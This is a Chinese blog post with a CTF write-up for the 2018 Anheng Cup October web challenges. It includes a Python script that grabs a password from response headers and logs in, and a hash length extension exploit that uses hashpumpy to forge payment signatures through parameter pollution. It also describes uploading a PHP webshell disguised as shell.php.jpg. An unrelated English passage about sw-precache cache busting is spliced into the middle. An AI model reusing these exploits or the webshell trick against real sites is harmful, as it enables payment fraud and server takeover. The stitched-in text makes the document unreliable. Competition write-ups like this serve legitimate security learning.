---
layout: post
title: 2018年安恒杯10月月赛&&周周练20-
author: "鲨鱼辣椒"
header-style: text
lang: zh
tags:
  - 安恒杯
  - ctf
  - web
  - writeup
---

> [安恒杯月赛地址](https://www.linkedbyx.com/home)

## web
复现的时候环境已经关闭了，所以没有截图了

###手速要快（100分）:
打开网站，是一个登陆页面，抓包在返回包的包头里发现password字段，很快就会刷新，所以要写个脚本，读取password字段后立刻提交，脚本如下，经过测试需要带上cookie才能成功。

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests
import re
import time

url1 = "http://101.71.29.5:10023/index.php"
response = requests.get(url=url1)
head = response.headers
# 将头信息转为可以进行json序列化的
x = requests.structures.CaseInsensitiveDict(head)
js = dict(x)
# print js # 此处打印出来的是一个json字符串
password=js.get("password")
cookie = js.get("Set-Cookie")
cookie=cookie[10:42]
url2 = "http://101.71.29.5:10023/login.php"
data = "password=123&submit_password=login"
data = {
        "password":password,
        "submit_password":""
    }
cookie = {'PHPSESSID': "5f3d0b93c3536da16830445227d1bad7"}
re2 = requests.post(url=url2,data=data,cookies=cookie)
print re2.text
print re2.cookies
```
登陆成功后跳转到一个上传页面，需要上传php木马，经过测试上传检测使用的是黑名单过滤，但是存在解析漏洞，上传shell.php.jpg即可getshell，flag在上级目录。

### Shop（300分）

`8月份人行比赛的原题`
本题考查了http参数污染和hash长度扩展攻击
HTTP 参数污染指的是在 HTTP 请求中 发送多个相同的参数，可能会导致一些非预期的结果。比如在 Querystring 中 发送两个 test 参数，Apache + PHP 会取最后一个:

```
http://127.0.0.1?test=123&test=456

$_GET['test']=456
```

而哈希长度扩展攻击适用于在消息与密钥的长度已知的情形下，所有采取了 H(密钥 ∥ 消息) 此类构造的散列函数。该攻击对 MD5 和 SHA-1 等基于 Merkle–Damgård 构造的算法有效。简单地说，就是当知道 MD5(secret) 时， 在不知道 secret 的情况下，可以很轻易的推算出 MD5(secret∥padding∥m’)
也就是说，我们需要结合上面两种手段，在原有的 Request Body 后追加 一些内容(padding 和用于覆盖的参数)，然后计算出新的 signature，完成支付。
我的exp如下，key长度可以从源代码里找到，或者直接爆破。

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from hashpumpy import hashpump
import requests
import re
sign = 'c5cc881eef97f4276b2c86bc0e42490e'
data ='order_id=72&buyer_id=19&good_id=38&buyer_point=300&good_price=888&order_create_time=1541586327.760354'
cookie = {'sessionid': 'aybgeojx2vtvekwt8bg8vqxjqde18na0'}
# sign = '58e9846626f7c1b8e80ac2da8b456e9d'
# data = 'order_id=91&buyer_id=22&good_id=34&buyer_point=200&good_price=50&order_create_time=1528269449.183292'
# cookie = {'sessionid': '6j31jogubedhgfo3pq8vlwploe5zzwmj'}
check_url = 'http://101.71.29.5:10014/payment/check'
#for i secret_key_length range(0,2000):
secret_key_length = 13
for i in range(1, 30):
    res = hashpump(sign, data, '&buyer_id={}'.format(i), secret_key_length)
    print(res)
    req = requests.post('{}?signature={}'.format(check_url, res[0]),
    data=res[1], cookies=cookie, headers={'Content-Type': 'application/x-www-form-urlencoded'})
    print(re.findall('\<h4\>.*?\<\/h4\>', req.text))
```

Instead of using raw URL as the cache key, sw-precache append a `_sw-precache=[hash]` to the end of each URL when populating, updating its cache and even fetching these subresouces. Those `_sw-precache=[hash]` are what we called **cache-busting parameter\***. It can prevent service worker from responding and caching out-of-date responses found in browsers’ HTTP cache indefinitely.

Because each build would re-calculate hashes and re-generate a new `sw.js` with new `precacheConfig` containing those new hashes, `sw.js` can now determine the version of each subresources thus decide what part of its cache needs a update. **This is pretty similar with what we commonly do when realizing long-term caching with webpack or gulp-rev, to do a byte-diff ahead of runtime.**

\*: Developer can opt out this behaviour with `dontCacheBustUrlsMatching` option if they set HTTP caching headers right. More details on [Jake’s Post](https://jakearchibald.com/2016/caching-best-practices/).

## easy audit和CoolCms没做出来，请参考下面微笑大神的博客，还有包括其他reverser和misc的一些题。

[https://www.smi1e.top](https://www.smi1e.top/%E5%AE%89%E6%81%92%E6%9D%AF%E6%9C%88%E8%B5%9Bwrite-up/)



[1]: https://www.linkedbyx.com/home
[2]: https://www.smi1e.top